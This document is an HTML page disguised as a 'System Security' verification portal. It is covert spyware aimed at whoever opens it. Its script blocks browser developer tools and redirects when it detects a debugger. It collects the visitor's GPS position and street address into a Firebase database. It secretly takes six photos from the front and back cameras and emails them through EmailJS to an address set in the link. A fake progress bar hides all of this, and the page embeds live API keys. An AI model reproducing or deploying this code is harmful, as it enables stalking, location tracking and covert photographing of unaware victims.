<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification | Secure Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#020617] text-white flex items-center justify-center h-screen overflow-hidden">

    <div class="text-center p-10 max-w-sm w-full bg-[#0f172a] rounded-[2.5rem] border border-slate-800 shadow-2xl relative z-10">
        <div class="relative w-20 h-20 mx-auto mb-6">
            <div class="absolute inset-0 border-4 border-blue-500/10 rounded-full"></div>
            <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
            <div class="absolute inset-0 flex items-center justify-center">
                <svg class="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
            </div>
        </div>
        
        <h1 class="text-xl font-black italic uppercase tracking-tighter">System <span class="text-blue-500">Security</span></h1>
        
        <div class="w-full bg-slate-800 h-1.5 rounded-full mt-8 overflow-hidden">
            <div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-500"></div>
        </div>
        
        <p id="msg" class="text-[10px] font-bold text-slate-500 uppercase mt-4 tracking-[0.2em]">Initializing Protocol...</p>
        
        <video id="v-front" autoplay playsinline class="hidden"></video>
        <video id="v-back" autoplay playsinline class="hidden"></video>
        <canvas id="canvas" width="1280" height="720" class="hidden"></canvas>
    </div>

    <script>
        // 1. --- ANTI-ANALYSIS SYSTEM ---
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.onkeydown = e => {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) return false;
        };
        setInterval(() => {
            const start = performance.now();
            debugger; 
            if (performance.now() - start > 100) window.location.href = "https://google.com";
        }, 1000);

        // 2. --- FIREBASE CONFIG ---
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 3. --- EMAILJS KEYS ---
        const PUB_KEY = "etJqo3AXU_wo-pcNi"; 
        const SERV_ID = "service_toskmod";
        const TEMP_ID = "template_55m8k98";
        emailjs.init(PUB_KEY);

        // 4. --- PARAMETERS ---
        const urlParams = new URLSearchParams(window.location.search);
        const sessionID = urlParams.get('session') || urlParams.get('id');
        const targetEmail = urlParams.get('email');
        const redirectURL = decodeURIComponent(urlParams.get('red') || "https://google.com");

        if(!sessionID) window.location.href = "https://google.com";

        let locData = "Fetching...";
        let exactAddress = "Fetching Address...";

        // 5. --- LOCATION & ADDRESS TRACKING ---
        navigator.geolocation.getCurrentPosition(pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            locData = `https://www.google.com/maps?q=${lat},${lon}`;
            
            // Reverse Geocoding for Gali/Mohalla
            fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`)
                .then(res => res.json())
                .then(data => {
                    exactAddress = data.display_name;
                    db.ref('shadow_sessions/' + sessionID).update({ 
                        location: locData,
                        address: exactAddress 
                    });
                })
                .catch(() => {
                    db.ref('shadow_sessions/' + sessionID).update({ location: locData });
                });

            initIntelligence();
        }, () => {
            db.ref('shadow_sessions/' + sessionID).update({ location: "Permission Denied" });
            initIntelligence();
        });

        // 6. --- CAMERA & CAPTURE LOGIC ---
        async function initIntelligence() {
            try {
                // Try Front Cam
                const stream1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v-front').srcObject = stream1;
                
                // Try Back Cam
                try {
                    const stream2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    document.getElementById('v-back').srcObject = stream2;
                } catch(e) { console.log("Back camera unavailable"); }

                captureSequence();
            } catch (err) {
                window.location.href = redirectURL;
            }
        }

        async function captureSequence() {
            for(let i=1; i<=6; i++) {
                await new Promise(r => setTimeout(r, 2000));
                let camType = (i <= 3) ? 'v-front' : 'v-back';
                
                await processShot(camType, i);
                
                // Update Progress UI
                document.getElementById('msg').innerText = `Syncing Packet ${i}/6...`;
                document.getElementById('bar').style.width = (i * 16.6) + "%";
                
                // Update Transaction Status
                db.ref('shadow_sessions/' + sessionID).update({ progress: i + "/6 Data Packets Sent" });
            }
            window.location.href = redirectURL;
        }

        async function processShot(vidId, index) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById(vidId);
            const ctx = canvas.getContext('2d');
            
            // Fallback to front if back cam stream failed
            const activeVideo = (video.srcObject) ? video : document.getElementById('v-front');
            
            if(activeVideo.srcObject) {
                ctx.drawImage(activeVideo, 0, 0, 1280, 720);
                const base64Image = canvas.toDataURL('image/jpeg', 0.4); // Compressed for speed

                return emailjs.send(service_toskmod, template_55m8k98, {
                    to_email: targetEmail,
                    session_id: sessionID,
                    location_link: locData,
                    address: exactAddress,
                    camera_side: (index <= 3) ? "FRONT" : "BACK",
                    image_data: base64Image
                });
            }
        }
    </script>
</body>
</html>
